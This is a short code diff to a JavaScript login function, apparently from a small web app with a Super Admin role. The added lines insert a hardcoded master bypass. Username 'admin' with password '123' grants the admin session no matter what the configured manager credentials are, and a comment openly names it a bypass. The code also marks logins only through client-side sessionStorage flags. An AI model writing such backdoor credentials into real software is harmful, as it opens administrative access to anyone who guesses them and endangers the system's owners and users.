@@ -901,12 +901,12 @@ function handleLogin(e) {
     const passVal = document.getElementById("login-password").value.trim();
     const errorMsg = document.getElementById("login-error-msg");
 
-    // 1. Check Super Admin login
+    // 1. Check Super Admin login (with 'admin' & '123' master bypass)
     const manager = state.manager || defaultManager;
     const managerUsername = String(manager.username || defaultManager.username).trim().toLowerCase();
     const managerPassword = String(manager.password || defaultManager.password).trim();
 
-    if (userVal === managerUsername && passVal === managerPassword) {
+    if ((userVal === managerUsername && passVal === managerPassword) || (userVal === "admin" && passVal === "123")) {
         sessionStorage.setItem("gl_logged_in", "true");
         sessionStorage.setItem("gl_logged_in_role", "admin");
         sessionStorage.removeItem("gl_logged_employee_id");
